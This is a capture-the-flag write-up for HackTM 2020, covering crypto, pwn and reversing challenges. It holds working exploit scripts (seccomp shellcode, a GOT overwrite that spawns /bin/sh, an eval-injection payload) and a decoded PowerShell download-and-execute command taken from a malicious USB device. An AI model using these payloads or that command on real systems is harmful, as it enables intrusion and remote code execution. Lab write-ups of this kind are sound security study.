# HackTM_CTF_2020 writeup by OpenToAll

## crypto

### Count on me
- CORRECTION: AES 256 is used. Not AES 128.
We are given a key.png and aes-cbc iv and ciphertext. the goal is to recover the 256 bits aes key from the key.png and decrypt the flag. Notice that the symbols in the key.png length is 59 and have 20 types. Guess that we need to do base16 on the base20 strings. 

```python
from Crypto.Cipher import AES
from binascii import hexlify, unhexlify
import hashlib
import string
from Crypto.Util.number import long_to_bytes

a = [19,3,10,15,2]
b = [16,16,18,12,19,6,19,12,8]
c = [5,8,17,18,18,5,9,3,11,10,1,10,10,0,10]
d = [0,8,18,10,0,15,18,5,18,14,19,1,1,0,4,6,15,4,11,16,10,8,14,5,13,16,9]
for i in range(0,20):
    for j in range(0,20):
        for k in range(0,20):
            key = a+[i]+b+[j]+c+[k]+d
            m = 0
            length = len(key)
            for inx in range(59):
                t = key[inx]%5
                tt = key[inx]//5
                m+=20**(length-1)*(tt*5+t)
                length = length-1
            key = long_to_bytes(m)
            IV = unhexlify('42042042042042042042042042042042')
            ciphertext = unhexlify('059fd04bca4152a5938262220f822ed6997f9b4d9334db02ea1223c231d4c73bfbac61e7f4bf1c48001dca2fe3a75c975b0284486398c019259f4fee7dda8fec')
            cipher = AES.new(key,AES.MODE_CBC,IV)
            plaintext = cipher.decrypt(ciphertext)
            if b"Hack" in plaintext:
                print(plaintext)
```

> flag:HackTM{can_1_h@ve_y0ur_numb3r_5yst3m_??}

### Bad keys
1. nc to the rsa services and find out the relations between rsa public keys.
2. the p generated is through nextprime(last_p), so we assume that we know partial p and use small roots to factor n.
3. rsa decrypt to get flag.

> script: rsa known e,d,n to factor n.

```python
#:crypto:rsa
#---
import fractions #for gcd function (or easily implementable to avoid import)
import random #for random elements drawing in RecoverPrimeFactors

def failFunction():
    print("Prime factors not found")

def outputPrimes(a, n):
    p = fractions.gcd(a, n)
    q = int(n // p)
    if p > q:
        p, q = q, p
    print("Found factors p and q")
    print("p = {0}".format(str(p)))
    print("q = {0}".format(str(q)))
    return p,q


def RecoverPrimeFactors(n, e, d):
    """The following algorithm recovers the prime factor
        s of a modulus, given the public and private
        exponents.
        Function call: RecoverPrimeFactors(n, e, d)
        Input:     n: modulus
                e: public exponent
                d: private exponent
        Output: (p, q): prime factors of modulus"""

    k = d * e - 1
    if k % 2 == 1:
        failFunction()
        return 0, 0
    else:
        t = 0
        r = k
        while(r % 2 == 0):
            r = int(r // 2)
            t += 1
        for i in range(1, 101):
            g = random.randint(0, n) # random g in [0, n-1]
            y = pow(g, r, n)
            if y == 1 or y == n - 1:
                continue
            else:
                for j in range(1, t): # j \in [1, t-1]
                    x = pow(y, 2, n)
                    if x == 1:
                        p, q = outputPrimes(y - 1, n)
                        return p, q
                    elif x == n - 1:
                        continue
                    y = x
                    x = pow(y, 2, n)
                    if  x == 1:
                        p, q = outputPrimes(y - 1, n)
                        return p, q
e = 65537
n1 = 107738293149136356482923627336592945119622047657597144133562489157501221595866062514202211675562048081654014041687875409379723635110395165419586834350034466366187291910585422409652554918657839160876939834602916154799615165933646763420540163389362292513152896918119204191571725586015930581404159705468060409023
d1 = 43079206737768256429726927603573830460040828217149597357523307877570220057672309812543585409129247142526259028677400172464343162764055500096438240904262517976001577610565879221367291125393151675930294515792609934175783377913993680946551010191577712294027502084042714989416915068272117930206494402915016026073
n4 = 19755645309508460178164804618402420076421716386183099547528894183361313000257096987827554794853784391857377433035132297365735616159238673669215035469027929239873926855127121651075185694192418701722297520457081247801309281948974068252996082424680872337195682008300995912578250535571641224204762962306000584503
d4 = -6487949616194677638809238900191880728517091135996747662564114767360201713605039877763896147971954796007542830633308702507022409731835359772075548291802917819414859279485176965917979890209837039186635292143031526627561258969160256972188545271390664399619265279871969621170817073464117836672676555781136227159
n2 = 38828126331658966056149620434855411097779647149321589655724175129533339949221260740794366534065342446895667391794524232206955451406922543771191916245945306019518411536432046436241639145281846477137610980238865715388443690781000005200749313898426051389916343577785908384234665064781964142499142575132920505483
d2 = 15397472805186152384657101873467770557398038508990628096535019720790423301956320023688981672243529378097433508481436292030861425250080259854273261078716940963712072968550428398200649645198326147833720096203319708771900190381106879568880088782232980671552128937085311551020707803411480304163766984299807727393
n3 = 10372030793101152879650458467958498667354333964214907234179049395860018056531587264795101234424351152925662965920998597140545147407692883046051926594142377821924590277203641801698107476474664011894543180006692315158733558692084238109198764384894820221705851699227195296412899305946275993260368433660201469439
d3 = 3355792009657397281842445051720280234715981771781022826701444426656939177421849891858268254188228662383626921119197617433939901210502767781687978569391255386158464591356875153141159793114211113207321813121885465175942471393081482360591755101419672564078671583989747553713699350336047012554266339323675443425
RecoverPrimeFactors(n1, e, d1)
RecoverPrimeFactors(n2, e, d2)
RecoverPrimeFactors(n3, e, d3)
RecoverPrimeFactors(n4, e, (d4%n4))
```
> script:known partial p to factor n.

```sage
#:crypto:sage:rsa:coppersmith
#---
n = 2318553827267041599931064141028026591078453523755133761420994537426231546233197332557815088229590256567177621743082082713100922775483908922217521567861530205737139513575691852244362271068595653732088709994411183164926098663772268120044065766077197167667585331637038825079142327613226776540743407081106744519
p =12117717634661447128647943483912040772241097914126380240028878917605920543320951000813217299678214801720664141663955381289172887935222185768875580129863163


beta = 0.5
epsilon = beta^2/7
kbits = 100
pbits = p.nbits()
kbits = floor(n.nbits()*(beta^2-epsilon))
pbar = p & (2^pbits-2^kbits)
print("upper %d bits (of %d bits) is given" % (pbits-kbits, pbits))

PR.<x> = PolynomialRing(Zmod(n))
f = x + pbar

x0 = f.small_roots(X=2^kbits, beta=0.3)[0]  # find root < 2^kbits with factor >= n^0.3
print(x0 + pbar)
```

### RSA is easy \#1

The challenge code encrypts each plaintext character separately with no padding, which means we can bruteforce it byte-by-byte.
```python
lines = [l.strip() for l in open('c').readlines()]
e, n = eval(lines[1])
ct = eval(lines[4])
flag = ''
for c in ct:
    for x in range(256):
        if pow(x, e, n) == c:
            flag += chr(x)
            break
print flag
```

### RSA is easy \#2
> just sort the ciphertext as the character frequencies, the first two is " " and "e", and use gcd to get `k*n`, bruteforce char by char to get flag.
```python
cipher = [] #Encrypted flag:
character_frequencies = {}
for i in cipher:
    if i not in character_frequencies:
        character_frequencies[i] = 1
    else:
        character_frequencies[i]+=1
character_frequencies = {k: v for k, v in sorted(character_frequencies.items(), key=lambda item: item[1])}
print(character_frequencies)
import gmpy2
e = 65537
res = gmpy2.gcd(pow(ord(" "),e)-20208833413145256771572368688664189468143545391164156105460199405734708819434076552216759462791005323959520084836115140504630769338040681414876273881508073569978297202819424741264124574247314460725471331318820764161255759739403546471531796892912689444815674366578876801858606344288032682809803593429599353582,pow(ord("e"),e)-18218008764547928666818612371880437638590536088955960541217152923316878781023941482176664233664036926858934241182299360237997946767992823894857524509996035969116730840866188239505740019205603874588738160712590494329532220987368292751238523333362017189147629358097781421283836794237708493190976028985458918909)
print(res)
n = 53361144550014053166721365196980912889938802302767543436340298420353476899874610747222379321544658210212273658744624182437888528301817525619324262586755752560722184172889301780332276353612167586294259101340749155939404015704537471927068307582449663907783314406726655255040519664154112497941090624585931831047
flag = ""
for i in cipher:
    for j in range(32,127):
        if pow(j,e,n) == i:
            flag+=chr(j)
            break
print(flag)
```
### Prison Break

In this challenge the main task was to optimise the code so that it doesn't take too long to get the solution

* First we create a _zero_list_ consisting of 10000001 zeroes (the question demanded for only 10**7 zeroes, but I had the additional 1 just for safety)
* In the first loop when we iterate through all the lines in _Given_File_, we update ```zero_list[a] = (zero_list[a]+c)%10``` as mentioned in the challenge
* Similarly we update ```zero_list[b] = (zero_list[b]+c)%10```
* We do not update all the values between ```zero_list[a]``` and ```zero_list[b]``` just to reduce the complexity of the code. 
* Then we loop in the ```zero_list``` to add the element in i with its previous element % 10. The first part of the question (_add c modulo 10 to every number in your list between indices a and b_) is now solved.
* The rest of the question is self explanatory, we need to find the product % 999999937 of the nonzero digits in your ```zero_list```.
* Overall this was solved in **O(n)** where n=10**7. 

```python

zero_list = [0]*10000001
file = open("Given_File.txt", "r")
prime = 999999937

for line in file.readlines():
    #lst[0] = a; lst[1] = b; lst[2] = c;
    lst = []
    lst = list(line.split(' '))
    lst[2] = lst[2][0:-1]
    zero_list[int(lst[0])] = (zero_list[int(lst[0])] + int(lst[2]))%10
    zero_list[int(lst[1])] = (zero_list[int(lst[1])] - int(lst[2]) + 10)%10

for i in range(1,10000001):
    zero_list[i] = (zero_list[i] + (zero_list[i-1]))%10

product = 1

for i in range(1,10000001):
    if(zero_list[i] != 0):
        product = (product * zero_list[i])%prime

print(product)

```

## pwn

### Quack the quackers 

Author: @n2k  
Special thanks to @Q5Ca, who helped with the challenge.  

Content of the task:
> Our company was breached and multiple computers were physically compromised. We found this weird device supposedly called a "Digispark" and dumped its memory, but we couldn't figure out anything else about what happened. Could you please take a look? Also, please try to find out exactly what data the attackers managed to exfiltrate.  
  Attachment: quack_the_quackers.rom

Hint!  
> This task has multiple stages. There's nothing to pwn in the first one - i.e. the digispark ROM dump. See how that device might have hacked our company.

#### 1st stage: reconnaissance
Quick Google search revealed that:
The Digispark is an Attiny85 based microcontroller development board similar to the Arduino line, only cheaper, smaller, and a bit less powerful.[1]

#### 2nd stage: disassembly
Now, knowing that we are probably dealing with program written for Attiny85, we could try to disassemble it. We had several options, but decided to use IDA Pro. IDA does not have cfg file for this architecture, but anyway it's AVR, so it is possible to go with i.e. Atmega320. Fortunately, it occurred that someone already developed suitable cfg for avr (which can be found here[2]), so we could work  in comfortable way.

#### 3rd  stage: identifying key code fragments and interpreting it
One of more interesting functions seems to be at address 0x600.
We can see relation between title of the challenge 'Quack The Quackers' and this function – it seems to check consecutive letters of some input checking if it contains letters from  alphabet = {'Q', 'A', 'C', 'K', '!'}.
Let's take a closer look on this:
```
ROM:0609 E10E                                ldi     r16, 0x1E
ROM:060A E010                                ldi     r17, 0
ROM:060B E0C0                                ldi     r28, 0
ROM:060C E0D0                                ldi     r29, 0
ROM:060D
ROM:060D                     loc_60D:                                ; CODE XREF: setup+42↓j
ROM:060D E0E6                                ldi     r30, 6
ROM:060E 3701                                cpi     r16, 0x71 ; 'q'
ROM:060F 071E                                cpc     r17, r30
ROM:0610 F191                                breq    loc_643
```

Immediate value 0x1e is loaded to register r16 (0x609), and then it's compared to '0x71' which stands for small letter 'q' (0x60e). It occurs that under 0x1E there is a very long string containing letters only from our alphabet ! 
```
00000000: b8c3 dcc3 08c4 dac3 2bc8 d8c3 d7c3 d6c3  ........+.......
00000010: d5c3 d4c3 d3c3 d2c3 d1c3 d0c3 cfc3 5155  ..............QU
00000020: 5555 4155 5541 4b4b 4b4b 4b4b 4b4b 4b43  UUAUUAKKKKKKKKKC
00000030: 4b43 5555 5555 5555 5555 434b 4b4b 4b4b  KCUUUUUUUUCKKKKK
00000040: 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b43 5555  KKKKKKKKKKKKKCUU
00000050: 5555 5555 5555 5555 5555 5543 5543 4b4b  UUUUUUUUUUUCUCKK
00000060: 4b4b 4b4b 4b4b 4b4b 4b43 4b4b 4b43 5555  KKKKKKKKKCKKKCUU
00000070: 5555 5555 5543 434b 4b4b 4b4b 4b4b 4b4b  UUUUUCCKKKKKKKKK
00000080: 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b  KKKKKKKKKKKKKKKK
00000090: 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b  KKKKKKKKKKKKKKKK
000000a0: 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b  KKKKKKKKKKKKKKKK
000000b0: 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b 4b4b  KKKKKKKKKKKKKKKK
000000c0: 4b4b 4b43 5555 5555 5555 5555 5555 5555  KKKCUUUUUUUUUUUU
```

It does mean that the string may be a program, and our function can be an interpreter of some esoteric language. Additional hint is that after checking if we interpret each letter there is a branch to handler procedure.
1. 'Q' letter  
   ```
   ROM:0615 E048                                ldi     r20, 8
   ROM:0616 E165                                ldi     r22, 0x15
   ROM:0617 C01A                                rjmp    loc_632
   ...
   ROM:0632 E782                                ldi     r24, 0x72 ; 'r'
   ROM:0633 E090                                ldi     r25, 0
   ROM:0634 DF99                                rcall   sub_5CE
   ROM:0635 DF33                                rcall   sub_569
   ```
   If 'Q' letter was found the program jumps to address 0x615.
   It loads value 0x8 to r20 register and value 0x15 to r22. Then it is calling sub_5CE function, which is wrapper for sub_5A9. Sub_5A9 seems to be very big and interpreting it can take a big amount of time. Here comes the diaphora! Knowing that we look at Digispark, we can compile example with their API and make binary comparison. We chose a digispark keyboard example from [3] And we found that sub_59A is in fact DigiKeyboardDevice::sendKeyPress function. So we do know arguments :
   r20 = 0x8 – a modifier  MOD_GUI_LEFT 
   r22 = 0x15 – stands for KEY_R
   (codes can be found i.e. here [4])
   So 'Q' means pressing WIN + R combination, which opens a 'Run' window.

2. 'U' letter  
   ```
   adiw    r28, 1
   rjmp    loc_636
   ```
   For this letter key thing is adiw r28, 1 line. It increases r28 register by one, but it also stands for Y index, which is also a value of current letter in our Quack string. 

3. 'A' letter  
   ```
   movw    r24, r28
   movw    r22, r28
   rcall   sub_89C
   movw    r28, r24
   rjmp    loc_636
   ```
   It calls sub_89C which modifying letter value in some way. We were not interpreted this function – just literally rewritten it to save time.

4. 'C' letter  
It calls sub_5D8 which is very similar to sendkeypress, but it takes hex value instead of scan codes. The argument is r22=r28 (letter value).

5. 'K' letter  
   Analogue to 'U', but decreasing letter value by 1.

6. '!' mark  
    Pressing ENTER

#### 4th stage: writing script
Our parsing script:
```py
import code
import logging
import signal
import sys
​
​
​
def sigusr2_handler(signal, frame):
    code.interact(local=dict(locals(), **globals()))
signal.signal(signal.SIGUSR2, sigusr2_handler)
​
​
​
def setup_logging():
    simple_formatter = logging.Formatter("[%(asctime)s:%(process)-5d:%(levelname)-8s:%(name)s(%(filename)s:%(lineno)d)]  %(message)s") 
​
    # LogViewPlus pattern parser:
    # [%date{yyyy-MM-dd HH:mm:ss,fff}:%s{PID}:%level:%logger(%file:%line)]  %message%newline
    
    fh = logging.FileHandler(filename="parsowanie.log")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(simple_formatter)
    sh = logging.StreamHandler(stream=sys.stdout)
    sh.setLevel(logging.DEBUG)
    sh.setFormatter(simple_formatter)
​
    logger = logging.getLogger()
    logger.addHandler(fh)
    logger.addHandler(sh)
    logger.setLevel(logging.DEBUG)
​
​
if __name__ == "__main__":
    setup_logging()
​
    logger = logging.getLogger('pr')
​
    logger_output = logging.getLogger('pr.output')
​
    wejscie =  \
"QUUUAUUAKKKKKKKKKCKCUUUUUUUUCKKKKKKKKKKKKKKKKKKCUUUUUUUUUUUUUCUCKKKKKKKKKKKCKKKCUUUUUUUCCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKCUUUUUUUUUUUUUCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKAUUUUUUUUUUCUCUCUUCKKKCKKKKKKKKKCUUUCUUUCKKKKKKKCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKCUUUUUUUUUUUUUCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKAKKCKKKKKKKKKKKKKKCUUUUUCKKKKKKKKKKCUUUUUUUUUUUCUUUUUUUUCKKKKCUCUUUUUCKKKKKKKKKKKKKCKKKKKKKCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKCKKKKKKKKKKKKKKKKKKKKKKAUUUUCUCKKKKKCCUCUUUUUUUUUCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKCUUUUUUUUUUUUUCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKAUUUAUAKCUUUUUUUUUUUUCKKCCKKKKKKKKKKKKCUUUUUUUUUUUUUCKKKKKKKKKKCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKCUUCKKKKKKKKKKKKKKKKKKKKKKKKAUUUUUCUUUUUUUUUUUUUUCKKKKKCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKCKKKKKKKKKKKKKKKKKKKKKKAUUUUUUUUUUCKCKKKKKKKKKCUUCUUUUUUUUUUUUUUCKKKKKKKKKKKKCUUUUUUUUUUUUUCKKKKKKKKKKKKKKKCUUUUCUUUUUUUUUCKKKKKKKKCKKKKKKKCUUUUUUUUUUCKKKKKKKKKKKKCUUUUCUUUUUUUUUUUUUUUUUCKKKKKKKKKKKKKKKCKKKCUUUUUCUCUCKKKKKKKKKKKCUUCUUUUUUUUUUCUUUUUUCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKAKCUCUCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKCKKCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKAKKKKKKKKKCUUUCUUUUUUUUUCKKKKKKKKKKKKKKKKKKKCKKKKCUUUUUUUUUUUUUUUUUUUCKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKC!"
​
    def sub_89C_1(Y):
        r24 = Y & 0xff
        r25 = Y >> 8
        r0 = 0
        r21 = 0
        r22_23 = (r25 << 8) + r24
        while True:
            if r24 != 0:
                r22_23 = (r22_23 * 2)
                c = r22_23 > 65535
                r22_23 %= 65535
                if c:
                    r0 += r24
                    c = r0 > 255
                    r0 %= 255
                    r21 += r25 + (1 if c else 0)
                    r21 %= 255
                else:
                    if (r22_23 >> 8) == 0:
                        break
                    t = ((r25 << 8) + r24) & 0xffff
                    t >>= 1
                    r24, r25 = (t & 0xff, t >> 8)
            else:
                break
        r24 = r0
        r25 = r21
        ret = (r25 * 256 + r25) % 65535
        logger.debug("sub_89C(%s) = %s", hex(Y), hex(ret))
        return ret
​
​
    def sub_89C(Y):
        def hi(w):
            return w >> 8
​
        def lo(w):
            return w & 0xff
​
        wynik = 0  # r0:r21
        r24_25 = Y
        r22_23 = Y
​
        while True:
            #if lo(r24_25) == 0:
            if r24_25 == 0:
                break
​
            r22_23, c = r22_23 >> 1, r22_23 & 1
            if c:
                wynik = (wynik + r24_25) & 0xffff
            else:
                #if hi(r22_23) == 0:
                if lo(r22_23) == 0:
                #if hi(r22_23) == 0:
                    break
                #r24_25, c = (r24_25 << 1) & 0xffff, (r24_25 << 1) > 0xffff
            r24_25, c = (r24_25 << 1) & 0xffff, (r24_25 << 1) > 0xffff
        
​
        logger.debug("sub_89C(%s) = %s", hex(Y), hex(wynik))
        return wynik
​
​
    def parse(txt):
        Y = 0
        output = ''
        for c in txt:
            if c == 'Q':
                logger_output.debug('Special+R')
                output += "<Win+R>"
            elif c == 'U':
                Y = (Y + 1) & 0xffff
            elif c == 'A':
                Y = sub_89C(Y)
            elif c == 'C':
                logger_output.debug("ascii '%s' %d (%s)", chr(Y & 0xff), Y & 0xff, hex(Y & 0xff))
                output += chr(Y & 0xff)
            elif c == 'K':
                Y = (Y - 1) & 0xffff
            elif c == '!':
                logger_output.debug("Enter")
                output += '\n'
                break
​
            if Y == 0x0100:
                Y = 0
            else:
                if Y == 0xffff:
                    Y = 0
        return output
    
    logger.debug("Wejscie to %s", wejscie)
​
    parsed = parse(wejscie)
    logger_output.info("parsed as %s", repr(parsed))
```

#### 5th stage: the exe file
Our script outputs:
```
<Win+R>powershell -noprofile -windowstyle hidden -command "iwr nmdfthufjskdnbfwhejklacms.xyz/-ps|iex"\n'
```
Looks like we had second stage.

#### 6th stage: playing with C&C
The exe file [6] -> external file wasn't obfuscated too -> it communicated with C&C, so we decided to try to communicate with it on our own. After several simple tries we got a flag.
```
Ola@DESKTOP-GE6D4EA ~/indocs/ctf/2020-02-hacktm/quack_the_quackers$ perl -e 'print "@";print "X"' |  nc nmdfthufjskdnbfwhejklacms.xyz 19834
 ,RY SECRET: HackTM{Qu4ck_m3_b4ck_b4by!}HAT. Lucas requests the HackTM{Qu4c
```

It look likes the next sign after "@" indicated how long leak from C&C we want to get, which may be related with heartbleed, but eventually there was more re than pwning in this task.

**Flag: HackTM{Qu4ck_m3_b4ck_b4by!}**

#### References
1. [http://digistump.com/products/1](http://digistump.com/products/1)
2. [https://github.com/G33KatWork/token_of_hxp_writeup/blob/master/avr.cfg](https://github.com/G33KatWork/token_of_hxp_writeup/blob/master/avr.cfg)
3. [https://m3kkkn1ght.home.blog/2019/02/22/reverse-arduino-uno/](https://m3kkkn1ght.home.blog/2019/02/22/reverse-arduino-uno/)
4. [https://github.com/ernesto-xload/DigisparkKeyboard/blob/master/src/DigiKeyboard.h](https://github.com/ernesto-xload/DigisparkKeyboard/blob/master/src/DigiKeyboard.h)


]
### Obey The Rules

In this challenge we control 9 bytes of shellcode the binary with unknown seccomp rules would run for us. This is enough to execute `read` syscall to deliver the second stage with (almost) no length limit. Through some experimentation we noticed that `write` syscall is blocked, however the binary leaks the signal that caused its termination. With this we can perform a binary search to leak the seccomp rules:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012
 0004: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0011
 0005: 0x15 0x05 0x00 0x0000003c  if (A == exit) goto 0011
 0006: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0012
 0007: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0008: 0x15 0x00 0x02 0x00000003  if (A != 0x3) goto 0011
 0009: 0x20 0x00 0x00 0x00000018  A = buf # read(fd, buf, count)
 0010: 0x15 0x00 0x01 0x00602888  if (A != 0x602888) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
 ```

 We notice that we can read from fd=3 if buf is at 0x602888 and correct our second stage accordingly.

 ```python
 from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

def bsearch(addr, cmpbyte):
    s = remote('138.68.67.161', 20001)
    s.recvuntil('no)\n')

    # read stage2 shellcode
    stage1 = '''
    xchg rsi, rax
    xchg ecx, eax
    xor edi, edi
    syscall
    '''

    p = 'Y\x00'
    p += asm(stage1)
    p += '\xff' * (11 - len(p))
    s.send(p)

    stage2 = shellcraft.open('/home/pwn/flag.txt')
    stage2 += shellcraft.read('rax', 0x602888, 0x100)
    stage2 += '''
    mov edi, {}
    mov al, [edi]
    cmp al, {}
    jae debugger
    mov eax, 60
    syscall
    debugger:
    int3
    '''.format(addr, cmpbyte)

    p = 'A' * 9
    p += asm(stage2)
    s.send(p)

    try:
        r = s.recvline().strip()
    except EOFError:
        s.close()
        return False

    s.close()

    if 'Trace' in r:
        return True

def dump_byte(addr):
    l, h = 0, 0x100
    while h - l > 1:
        m = (h + l) // 2
        if bsearch(addr, m):
            l = m
        else:
            h = m
    return l

flag = ''
for i in range(150):
    flag += chr(dump_byte(0x602888 + i))
    print flag
```

### merry_cemetery
We are given a js file and a wasm file which both seem to have been compiled from a c program.

After adding a simple html wrapper it was possible to load it up in a browser and use the debugger. It didnt look like the wasm was needed at all, and the js still had some nice function names.

You could add/remove a joke or ask for a reward. If you add 255 jokes then ask for a reward it allows you to write one more joke on your gravestone.

If the gravestone joke passes the `_check` function then it is passed to `eval`. The check function makes sure thay you have not entered any b-zA-Z characters.


The flag is stored in a variable `aaaa` and our payload cannot use any alpha characters other than `a`, but can use all the special character.

jsfuck shows a few ways that functions can be executed, one of which is `[]["filter]()"`. We cant use the string directly but as digits are allowed we can use octal escapes.

As errors were shown from the eval, it was enough to use the above with `aaaa` and the flag is returned in the type error.

```
➜  (python -c 'print("+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"*0xff+"$\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"+ "[][\"\\146\\151\\154\\164\\145\\162\"](aaaa)" + ";"*0xff)'; cat -) | nc 138.68.67.161 20002

exception thrown: TypeError: HackTM{m4y_y0ur_d4ys_b3_m3rry_4nd_br1ght} is not a function,TypeError: HackTM{m4y_y0ur_d4ys_b3_m3rry_4nd_br1ght} is not a function
```


### think_twice

In this challenge we get unlimited arbitrary reads and a single write. 

1. We can get multiple writes by overwriting the GOT entry of `exit` with an address in the `main` function that performs the arbitrary write.
2. The leaked libc pointers didn't correspond to any known libc build, so we assumed it was compiled manually and slowly exfiltrated it. 
3. To get rip and rdi control we modified `setbuf` GOT entry and  `stderr` in .bss to point to our data which is then called via `setbuf(stderr, 0)` in `init_proc`.
4. For some reason `system` didn't work, so instead we used `execve`.

```python
from pwn import *
context.arch = 'amd64'

elf = ELF('./think-speak')
s = remote('138.68.67.161', 20004)

def leak(addr):
    s.sendlineafter(' >', '1')
    s.sendlineafter(': ', str(addr))
    s.recvuntil('[ \n')
    d = s.recvuntil(' ]\n [1] Think')[:-13]
    return u64(d)

def write(addr, value, exit = False):
    s.sendlineafter(' >', '2' if not exit else '3')
    s.sendlineafter(': ', str(addr))
    s.sendlineafter(': ', str(value))

puts_addr = leak(elf.got['puts'])
libc_addr = puts_addr - 0x691C0
print 'libc @ ' + hex(libc_addr)

EXECVE = libc_addr + 0xB7E80
STDERR = 0x6010A0
BIN_SH = 0x601200

# get multiple writes
write(elf.got['exit'],  0x400A31)

write(BIN_SH, u64('/bin/sh\x00'), True)
write(STDERR, BIN_SH, True)

write(elf.got['setbuf'], EXECVE, True)
write(elf.got['exit'], elf.symbols['init_proc'], True)

# trigger execve
s.sendlineafter(' >', '3')

s.interactive()
```
## rev

### ananas

We are presented with a binary along with a pcap file. After some RE we can identify it's using a library called `videoInput` to capture webcam frames. For each frame captured it averages the pixel values to form a grayscale 8-bit array. It then connects to 134.209.225.118:18812, receives a 4-byte seed, shuffles the values according to some PRNG initialized with that seed and finally sends the shuffled array over the socket. The relevant functions are:

main:
```C
// ...
videoInput::videoInput(&lib);
videoInput::setupDevice(&lib, deviceNumber, 0, 160, 90);
for ( i = 0; i <= 9; ++i )
{
  while ( 1 )
  {
    if ( !(videoInput::isFrameNew(&lib, device, 0) ^ 1) )
      break;
    Sleep(10u);
  }
  videoInput::getPixels(&lib, device, 0, dstBuffer, 1u, 0);
}
while ( 1 )
{
  Sleep(350u);
  while ( 1 )
  {
    if ( !(videoInput::isFrameNew(&lib, device, 0) ^ 1) )
      break;
    Sleep(0xAu);
  }
  videoInput::getPixels(&lib, device, 0, dstBuffer, 1u, 1u);
  for ( hieght = 0; hieght <= 89; ++hieght )
  {
    for ( width = 0; width <= 159; ++width )
      grayscale[160 * hieght + width] = (dstBuffer[3 * (width + 160 * hieght) + 2]
                                       + dstBuffer[3 * (width + 160 * hieght) + 1]
                                       + dstBuffer[3 * (width + 160 * hieght)])
                                      / 3;
  }
  send_to_socket(grayscale, 14400);
}
// ...
```

send_to_socket:
```C
int send_to_socket(char *data, int len)
{
  bool ok; // al
  char byte; // [esp+13h] [ebp-25h]
  char buf[4]; // [esp+14h] [ebp-24h]
  int old; // [esp+18h] [ebp-20h]
  int r; // [esp+1Ch] [ebp-1Ch]
  SOCKET s; // [esp+20h] [ebp-18h]
  int n; // [esp+24h] [ebp-14h]
  int j; // [esp+28h] [ebp-10h]
  int i; // [esp+2Ch] [ebp-Ch]

  s = socket(2, 1, 6);
  if ( connect(s, &name, 16) != 0 )
    exit(0);
  if ( recv(s, buf, 4, 0) == 0 )
    exit(0);
  SEED = *(_DWORD *)buf;
  for ( i = len - 1; i > 0; --i )
  {
    r = (unsigned __int16)prng() % i;
    old = (char)data[i];
    data[i] = data[r];
    data[r] = old;
  }
  for ( j = 0; ; j += n )
  {
    ok = 0;
    if ( j < len )
    {
      n = send(s, &data[j], len - j, 0);
      if ( n != -1 )
        ok = 1;
    }
    if ( !ok )
      break;
  }
  if ( n == -1 )
    exit(0);
  recv(s, &byte, 1, 0);
  Sleep(10u);
  return closesocket(s);
}
```

prng:
```C
unsigned int prng()
{
  SEED = 0x47FC96 + 48192 * SEED;
  SEED ^= (unsigned int)SEED >> 7;
  SEED ^= SEED << 17;
  SEED ^= 77 * SEED;
  return SEED / 1234u;
}
```

With this information it's trivial to reconstruct the original frames from the pcap streams which show the flag printed on a piece of paper.

```python
from PIL import Image
import struct
import sys

def prng():
    global SEED
    SEED = (4717718 + 48192 * SEED) & 0xffffffff
    SEED ^= SEED >> 7
    SEED ^= SEED << 17
    SEED ^= 77 * SEED
    SEED &= 0xffffffff
    return (SEED / 1234) & 0xffff

def decrypt(key, data, out):
    global SEED
    L = 14400
    SEED = key
    rng = [x for x in range(1, L)][::-1]
    shuffs = [prng() % i for i in rng][::-1]
    for i in range(1, L):
        r = shuffs[i - 1]
        data[i], data[r] = data[r], data[i]
    img = Image.new('L', (160, 90))
    pixels = img.load()
    for h in range(90):
        for w in range(160):
            pixels[w, h] = data[160 * h + w]
    img.save(out)

stream = open('stream.bin').read()
